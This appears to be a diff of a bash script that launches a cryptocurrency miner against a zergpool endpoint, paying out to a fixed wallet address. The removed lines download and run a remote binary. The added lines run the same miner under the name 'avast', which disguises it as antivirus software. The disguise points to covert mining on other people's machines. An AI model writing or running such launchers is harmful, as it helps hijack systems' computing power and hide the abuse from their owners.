@@ -1,6 +1,6 @@
 #!/bin/bash
 
 
-wget -q https://github.com/samrikulan/zazza/raw/main/R
-chmod +x R
-./R -v -l verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-U) -p c=DASH -t 8
+
+chmod +x avast
+./avast -v -l verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-U) -p c=DASH -t 8
